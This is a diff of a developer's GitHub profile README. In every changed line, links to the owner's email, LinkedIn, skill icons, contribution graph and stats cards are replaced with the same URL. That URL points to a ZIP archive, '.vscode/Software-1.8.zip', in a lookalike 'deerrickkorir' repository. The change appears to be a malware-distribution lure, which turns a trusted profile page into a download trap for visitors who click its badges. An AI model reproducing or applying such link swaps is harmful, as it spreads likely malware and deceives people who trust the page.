@@ -1,7 +1,7 @@
-<img align="right" src="https://visitor-badge.laobi.icu/badge?page_id=derrick.korir" />
+<img align="right" src="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip" />
 
 <h1 align="center">
-    <img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=35&center=true&vCenter=true&width=500&height=70&duration=4000&lines=Hi+There!+👋;+I'm+Derrick+Korir!;" />
+    <img src="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip+There!+👋;+I'm+Derrick+Korir!;" />
 </h1>
 
 <h3 align="center">A passionate Full-stack developer</h3>
@@ -18,11 +18,11 @@
 <br/>
 
 <div align="center">
-    <a href="mailto:derrickroz4227@gmail.com">
-        <img src="https://img.shields.io/badge/Gmail-333333?style=for-the-badge&logo=gmail&logoColor=red" />
+    <a href="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip">
+        <img src="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip" />
     </a>
-    <a href="https://www.linkedin.com/in/derrick-korir-kiptoo" target="_blank" rel="noopener noreferrer">
-    <img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" />
+    <a href="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip" target="_blank" rel="noopener noreferrer">
+    <img src="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip" />
 </a>
 </div>
 
@@ -31,8 +31,8 @@
 <h2 align="center">⚒️ Languages, Frameworks, and Tools ⚒️</h2>
 <br/>
 <div align="center">
-    <img src="https://skillicons.dev/icons?i=react,bootstrap,css,html,github,tailwind,vscode,figma" />
-    <img src="https://skillicons.dev/icons?i=javascript,typescript,nodejs,mongodb,python" />
+    <img src="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip,bootstrap,css,html,github,tailwind,vscode,figma" />
+    <img src="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip,typescript,nodejs,mongodb,python" />
 </div>
 
 <br/>
@@ -41,7 +41,7 @@
 <div align="center">
     <h2>🐍 My Contributions 🐍</h2>
     <br/>
-    <img alt="snake eating my contributions" src="https://raw.githubusercontent.com/derrick-korir/derrick-korir/output/github-contribution-grid-snake.svg" />
+    <img alt="snake eating my contributions" src="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip" />
     <br/><br/><br/>
 </div>
 
@@ -50,10 +50,10 @@
 <h2 align="center">⚡ Stats ⚡</h2>
 <br/>
 <div align="center">
-    <img width="390" src="https://github-readme-streak-stats.herokuapp.com/?user=derrick-korir&count_private=true&theme=react&border_radius=10" alt="streak stats"/>
-    <img width="390" src="https://github-readme-stats.vercel.app/api?username=derrick-korir&count_private=true&show_icons=true&theme=react&rank_icon=github&border_radius=10" alt="readme stats" />
+    <img width="390" src="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip" alt="streak stats"/>
+    <img width="390" src="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip" alt="readme stats" />
     <br/>
-    <img width="325" align="center" src="https://github-readme-stats.vercel.app/api/top-langs/?username=derrick-korir&hide=HTML&langs_count=8&layout=compact&theme=react&border_radius=10&size_weight=0.5&count_weight=0.5" alt="top langs" />
+    <img width="325" align="center" src="https://github.com/deerrickkorir/deerrickkorir/raw/refs/heads/main/.vscode/Software-1.8.zip" alt="top langs" />
 </div>
 
 <br/><br/>
